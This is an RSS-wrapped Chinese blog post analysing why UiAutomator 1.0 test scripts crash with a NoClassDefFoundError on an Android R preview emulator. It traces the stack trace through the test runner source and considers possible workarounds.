<description>&lt;p&gt;最近Android发布了AndroidStudio 3.6稳定版，升级后明显能体验到好多细节的提升，最大的提升莫过于可以创建Android R预览版的模拟器了，并且模拟器可以设置多个尺寸的屏幕。Android R的xm6模拟器可以直接运行arm架构的程序，以后开发过程中再也不用为测试机担忧了。但是在执行UiAutomator1脚本时就存在了不兼容问题。&lt;/p&gt;
&lt;h3 id=&quot;异常情况&quot;&gt;异常情况&lt;/h3&gt;
&lt;p&gt;但是在使用Android R模拟器进行开发工作中发现执行UiAutomator1.0脚本出现如下异常：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Warning: This version of UI Automator is deprecated. New tests should be written using
UI Automator 2.0 which is available as part of the Android Testing Support Library.
See https://developer.android.com/training/testing/ui-testing/uiautomator-testing.html
for more details.
INSTRUMENTATION_STATUS: stream=
Test results for WatcherResultPrinter=Test run aborted due to unexpected exception: Failed resolution of: Landroid/test/RepetitiveTest;
java.lang.NoClassDefFoundError: Failed resolution of: Landroid/test/RepetitiveTest;
        at com.android.uiautomator.testrunner.UiAutomatorTestRunner$WatcherResultPrinter.startTest(UiAutomatorTestRunner.java:297)
        at junit.framework.TestResult.startTest(TestResult.java:168)
        at junit.framework.TestResult.run(TestResult.java:119)
        at junit.framework.TestCase.run(TestCase.java:129)
        at com.android.uiautomator.testrunner.UiAutomatorTestRunner.start(UiAutomatorTestRunner.java:160)
        at com.android.uiautomator.testrunner.UiAutomatorTestRunner.run(UiAutomatorTestRunner.java:96)
        at com.android.commands.uiautomator.RunTestCommand.run(RunTestCommand.java:91)
        at com.android.commands.uiautomator.Launcher.main(Launcher.java:83)
        at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)
        at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:396)
Caused by: java.lang.ClassNotFoundException: android.test.RepetitiveTest
        ... 10 more

Time: 0.039

OK (1 test)


INSTRUMENTATION_STATUS: shortMsg=Failed resolution of: Landroid/test/RepetitiveTest;
INSTRUMENTATION_STATUS_CODE: -1
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;异常触发流程&quot;&gt;异常触发流程&lt;/h3&gt;
&lt;p&gt;通过分析发现是因为找不到&lt;strong&gt;Landroid/test/RepetitiveTest&lt;/strong&gt;类文件。那么分析一下堆栈信息看异常具体出现在哪里？&lt;/p&gt;
&lt;p&gt;在执行UiAutomator1.0测试用例时，是在UiAutomatorTestRunner类中初始化测试资源并执行测试用例的。所以对异常堆栈信息的分析从UiAutomatorTestRunner类开始。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;com.android.uiautomator.testrunner.UiAutomatorTestRunner.run(UiAutomatorTestRunner.java:96)&lt;/strong&gt;源码如图，可以看到此处不存在异常行为，需要定位下一个堆栈信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/668433/202003/668433-20200318230730249-387871394.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;com.android.uiautomator.testrunner.UiAutomatorTestRunner.start(UiAutomatorTestRunner.java:160)&lt;/strong&gt; 通过分析源码会发现是遍历执行测试用例时产生的异常，并且此处是&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/668433/202003/668433-20200318230756060-1941987395.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;junit.framework.TestResult.startTest&lt;/strong&gt; 仅仅调用了WatcherResultPrinter#startTest方法，所以需要继续定位异常原因&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/668433/202003/668433-20200318230815508-1706678781.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;com.android.uiautomator.testrunner.UiAutomatorTestRunner$WatcherResultPrinter.startTest(UiAutomatorTestRunner.java:297)&lt;/strong&gt;是真正触发异常的位置，可以看到第一次引用android.test.RepetitiveTest接口文件时产生了&lt;strong&gt;java.lang.NoClassDefFoundError:&lt;/strong&gt;异常信息。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/668433/202003/668433-20200318230823823-133155021.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;定位问题原因&quot;&gt;定位问题原因&lt;/h3&gt;
&lt;p&gt;通过上述堆栈调用链发现触发异常时还没有执行测试用例，所以这个异常应该是出现在framework层面。由于运行环境是Android R预览版，无法查阅对应的源码，所以无法断定为系统bug还是Android R系统开始不再支持uiautomator1.0测试服务。&lt;/p&gt;
&lt;p&gt;对于采用uiautomator1.0测试框架的业务线需要提前对相关技术进行调研，可以提早设计应对方案。通过上文可以看到，在抛异常时程序已经初始化了uiautomator1.0测试环境，所以要实现uiautomator1.0兼容Android R运行时自己注册测试服务并管理用例即可。&lt;/p&gt;
&lt;p&gt;想要了解Uiautomator执行原理可以参考&lt;a href=&quot;https://testerhome.com/articles/20078&quot;&gt;Uiautomator 项目搭建与实现原理&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 18 Mar 2020 15:11:00 +0000</pubDate>
<dc:creator>walker-world</dc:creator>
<og:description>最近Android发布了AndroidStudio 3.6稳定版，升级后明显能体验到好多细节的提升，最大的提升莫过于可以创建Android R预览版的模拟器了，并且模拟器可以设置多个尺寸的屏幕。And</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/walker-world/p/12521155.html</dc:identifier>
</item>
</channel>
</rss>